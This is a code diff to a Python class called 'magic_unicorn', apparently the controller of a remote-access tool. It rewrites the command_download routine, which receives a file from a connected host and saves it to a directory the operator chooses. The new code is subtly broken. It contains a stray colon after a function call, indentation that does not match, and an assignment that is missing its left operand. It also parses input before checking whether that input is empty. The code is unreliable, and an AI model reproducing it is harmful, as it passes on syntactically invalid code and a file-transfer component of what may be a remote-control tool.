@@ -106,6 +106,7 @@ class magic_unicorn:
         self.handler = handler(server)
         self.custom = custom()
         self.badges = badges()
+        self.fsmanip = fsmanip()
         
         self.main_directory = os.getcwd()
         self.home_directory = str(pathlib.Path.home())
@@ -184,21 +185,30 @@ class magic_unicorn:
                     return
 
     def command_download(self, cmd_data):
+        output_filename = os.path.split(cmd_data.split(" ")[0])[1]
+        output_directory = cmd_data.split(" ")[1]
         if not cmd_data.strip():
             pass
         else:
-            output_filename = cmd_data.split("/")[-1] if "/" in cmd_data else cmd_data.split("\\")[-1] if "\\" in cmd_data else cmd_data
-            wf = open(output_filename, "wb")
-            while True:
-                data = self.handler.recv()
-                if data == b"success":
-                    break
-                elif data == b"fail":
-                    wf.close()
-                    os.remove(output_filename)
-                    return
-                wf.write(data)
-            wf.close()
+            exists, path_type = self.fsmanip.exists_directory(output_directory):
+                if exists:
+                    if path_type != "file":
+                        if output_directory[-1] == "/":
+                            output_directory = output_directory + output_filename
+                        else:
+                            output_directory =  + "/" + output_filename
+                            
+                wf = open(output_directory, "wb")
+                while True:
+                    data = self.handler.recv()
+                    if data == b"success":
+                        break
+                    elif data == b"fail":
+                        wf.close()
+                        os.remove(output_directory)
+                        return
+                    wf.write(data)
+                wf.close()
 
     def command_upload(self, cmd_data):
         if not cmd_data.strip():
